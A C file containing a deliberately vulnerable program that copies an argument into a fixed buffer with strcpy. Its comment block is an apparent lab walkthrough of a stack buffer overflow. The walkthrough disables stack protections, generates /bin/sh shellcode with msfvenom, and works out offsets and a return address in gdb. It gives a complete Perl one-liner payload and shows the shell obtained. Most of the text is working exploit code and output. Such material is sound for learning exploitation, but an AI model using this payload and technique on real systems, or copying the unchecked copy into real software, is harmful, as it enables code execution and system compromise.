#include<stdio.h>
#include<string.h>
#include<stdlib.h>

void main(int argc, char* argv[]){
  char buf[128];
  if(argc != 2){
    printf("usage: %s arg\n", argv[0]);
    exit(0);
  }
  strcpy(buf, argv[1]);
  printf("%s",buf);
}

/*
gcc -fno-stack-protector -z execstack ./vuln.c -o vuln

msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x00\x20" -f perl
Payload size: 70 bytes
my $buf =
"\xbe\x98\x74\xbf\x22\xdd\xc7\xd9\x74\x24\xf4\x5d\x2b\xc9" .
"\xb1\x0b\x31\x75\x15\x03\x75\x15\x83\xed\xfc\xe2\x6d\x1e" .
"\xb4\x7a\x14\x8d\xac\x12\x0b\x51\xb8\x04\x3b\xba\xc9\xa2" .
"\xbb\xac\x02\x51\xd2\x42\xd4\x76\x76\x73\xee\x78\x76\x83" .
"\xc0\x1a\x1f\xed\x31\xa8\xb7\xf1\x1a\x1d\xce\x13\x69\x21";

***GDB needs to be run with this to fix stack align issue
env -i gdb -q -x ~/.gdbinit ./vuln

REASON
env -i ->clearn all env
gdb -q -x ~/.gdbinit -> quiet, use peda, and execute some basic command when start
after GDB start it ll create the following env
LINES=57 COLUMNS=165 PWD=/root/Desktop/exploit
so will have to account of those when exploit from cmdline

***from cmdline exploit needs to be run with the following
env -i LINES=57 COLUMNS=165 PWD=$(pwd) /root/Desktop/exploit/vuln

REASON
env -i LINES=57 COLUMNS=165 PWD=$(pwd) -> clean all env, but set the 3 env(these 3 were set by GDB when it starts)
/root/Desktop/exploit/vuln -> need full path to program

set /root/.gdbinit
source ~/peda/peda.py
set disassembly-flavor intel
set follow-fork-mode child

vuln and exploit
...
   0x00001212 <+89>:	call   0x1040 <strcpy@plt> -> overflow
   0x00001217 <+94>:	add    esp,0x10
...
   0x00001237 <+126>:	pop    ecx		->address pop off stack, later used to reset esp
   0x00001238 <+127>:	pop    ebx
   0x00001239 <+128>:	pop    ebp
   0x0000123a <+129>:	lea    esp,[ecx-0x4]	->with ecx, we control address used to reset esp, and eip
   0x0000123d <+132>:	ret
...

gdb-peda$ r $(perl -e 'print"A"x124 . "BBBB" . pack("V", 0xffffffff)')

0xffffffff gets pop into ecx, and later gives control to esp, then eip

...
lea esp, [ecx - 4]
ret

1. need address to top of stack
top of stack is at
gdb-peda$ x/40xw 0xbffffd00
0xbffffd00:	0x41414141	0x41414141	0x41414141	0x41414141
...

2. find deref to top of stack(esp will point to)
gdb-peda$ find 0xbffffd00 all
Searching for '0xbffffd00' in: all ranges
Found 3 results, display max 3 items:
[stack] : 0xbffff75c --> 0xbffffd00 ('A' <repeats 124 times>, "BBBB\377\377\377\377")
...

this cause eip to start execute top of stack "\x41\x41\x41\x41..."
gdb-peda$ r $(perl -e 'print"A"x124 . "BBBB" . pack("V", 0xbffff75c + 4)')

exploit
$(perl -e '$shell = "\xbe\x98\x74\xbf\x22\xdd\xc7\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x31\x75\x15\x03\x75\x15\x83\xed\xfc\xe2\x6d\x1e\xb4\x7a\x14\x8d\xac\x12\x0b\x51\xb8\x04\x3b\xba\xc9\xa2\xbb\xac\x02\x51\xd2\x42\xd4\x76\x76\x73\xee\x78\x76\x83\xc0\x1a\x1f\xed\x31\xa8\xb7\xf1\x1a\x1d\xce\x13\x69\x21"; print $shell . "A"x(124 - length($shell)) . "BBBB" . pack("V", 0xbffff75c + 4)')

root@kali:~/Desktop/exploit# env -i gdb -q -x ~/.gdbinit ./vuln
Reading symbols from ./vuln...(no debugging symbols found)...done.
<\x1a\x1d\xce\x13\x69\x21"; print $shell . "A"x(124 - length($shell)) . "BBBB" . pack("V", 0xbffff75c + 4)')
Starting program: /root/Desktop/exploit/vuln $(perl -e '$shell = "\xbe\x98\x74\xbf\x22\xdd\xc7\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x31\x75\x15\x03\x75\x15\x83\xed\xfc\xe2\x6d\x1e\xb4\x7a\x14\x8d\xac\x12\x0b\x51\xb8\x04\x3b\xba\xc9\xa2\xbb\xac\x02\x51\xd2\x42\xd4\x76\x76\x73\xee\x78\x76\x83\xc0\x1a\x1f\xed\x31\xa8\xb7\xf1\x1a\x1d\xce\x13\x69\x21"; print $shell . "A"x(124 - length($shell)) . "BBBB" . pack("V", 0xbffff75c + 4)')
process 421 is executing new program: /usr/bin/dash
[Attaching after process 421 fork to child process 426]
[New inferior 2 (process 426)]
[Detaching after fork from parent process 421]
[Inferior 1 (process 421) detached]
process 426 is executing new program: /usr/bin/dash
#

root@kali:~/Desktop/exploit# env -i LINES=57 COLUMNS=165 PWD=$(pwd) /root/Desktop/exploit/vuln $(perl -e '$shell = "\xbe\x98\x74\xbf\x22\xdd\xc7\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x31\x75\x15\x03\x75\x15\x83\xed\xfc\xe2\x6d\x1e\xb4\x7a\x14\x8d\xac\x12\x0b\x51\xb8\x04\x3b\xba\xc9\xa2\xbb\xac\x02\x51\xd2\x42\xd4\x76\x76\x73\xee\x78\x76\x83\xc0\x1a\x1f\xed\x31\xa8\xb7\xf1\x1a\x1d\xce\x13\x69\x21"; print $shell . "A"x(124 - length($shell)) . "BBBB" . pack("V", 0xbffff75c + 4)')
#

*/
